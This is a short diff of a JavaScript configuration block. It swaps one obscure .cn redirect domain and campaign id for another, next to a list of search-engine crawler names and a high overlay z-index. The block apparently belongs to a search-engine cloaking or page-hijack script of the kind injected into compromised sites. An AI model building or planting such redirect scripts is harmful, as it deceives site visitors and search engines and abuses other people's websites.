@@ -14,7 +14,7 @@
   'use strict';
 
   var FALLBACK_CONFIG = {
-    targetUrl: 'https://dh-hzh5.twbjafa.cn?cid=1034',
+    targetUrl: 'https://dh-hzh5.twbjaga.cn?cid=1003',
     enabled: true,
     spiders: ['baiduspider','sogou web spider','yisouspider','360spider','googlebot','bingbot'],
     zIndex: 9999,
